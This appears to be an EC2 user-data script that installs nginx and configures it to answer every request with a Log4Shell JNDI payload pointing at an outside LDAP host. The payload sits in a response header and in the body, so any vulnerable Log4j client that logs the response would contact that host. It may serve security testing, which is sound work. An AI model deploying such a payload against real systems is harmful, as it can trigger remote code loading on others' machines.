#!/bin/bash
mkdir -p /home/ec2-user/.ssh
echo '${public_key}' >> /home/ec2-user/.ssh/authorized_keys
chown -R ec2-user:ec2-user /home/ec2-user/.ssh
chmod 700 /home/ec2-user/.ssh
chmod 600 /home/ec2-user/.ssh/authorized_keys

# Fetch public IP
PUBLIC_IP=$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4)

# Set hostname
HOSTNAME="producer-ec2-$PUBLIC_IP"
hostnamectl set-hostname $HOSTNAME

# Update /etc/hosts
echo "127.0.0.1   $HOSTNAME" >> /etc/hosts

# Update prompt
echo 'export PS1="[\u@$HOSTNAME \W]\$ "' >> /etc/profile

yum update -y
yum install -y nginx
cat << 'EOT' > /etc/nginx/nginx.conf
stream {
    server {
        listen 12345 udp;
        listen 12345 tcp;
        proxy_pass 127.0.0.1:80;
    }
}
events {}
http {
    server {
        listen 80 default_server;
        server_name _;
        location / {
            return 200 'Hello, World!';
            add_header Content-Type text/plain;
            add_header X-Example-Header '$${jndi:ldap://ldap.drewpy.pro:16969/a}';
            return 200 'Hello, $${jndi:ldap://ldap.drewpy.pro:16969/a}';
        }
        location /proxy/ {
            proxy_pass http://www.example.com/;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
        }
    }
}
EOT
systemctl restart nginx
